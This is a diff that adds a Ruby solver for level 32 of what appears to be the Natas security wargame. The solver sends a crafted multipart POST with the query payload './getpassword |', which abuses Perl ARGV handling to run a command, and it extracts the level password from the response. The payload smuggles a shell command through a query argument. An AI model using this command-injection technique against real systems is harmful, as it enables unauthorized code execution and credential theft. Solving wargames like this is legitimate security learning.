@@ -911,4 +911,37 @@ end
 # Level 32
 class NatasLevel32 < NatasLevelBase
   LEVEL = 32
+  PAGE = '/'
+  PAYLOAD = %(./getpassword |)
+
+  def exec
+    payload = URI.encode_www_form_component(PAYLOAD)
+    payload.gsub!('+', '%20')
+    request = Net::HTTP::Post.new(
+      "#{PAGE}?#{payload}"
+    )
+    request.basic_auth(@login, @password)
+    request['Content-Type'] = 'multipart/form-data; boundary="boundary"'
+    body = <<~BODY
+    --boundary
+    Content-Disposition: form-data; name="file"
+
+    ARGV
+    --boundary
+    Content-Disposition: form-data; name="file"; filename="file"
+
+    --boundary--
+    BODY
+
+    request.body = body.gsub("\n", "\r\n")
+    data = @client.request(request).body
+    match = /<th>(\w{32})\n/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 33
+class NatasLevel33 < NatasLevelBase
+  LEVEL = 33
 end
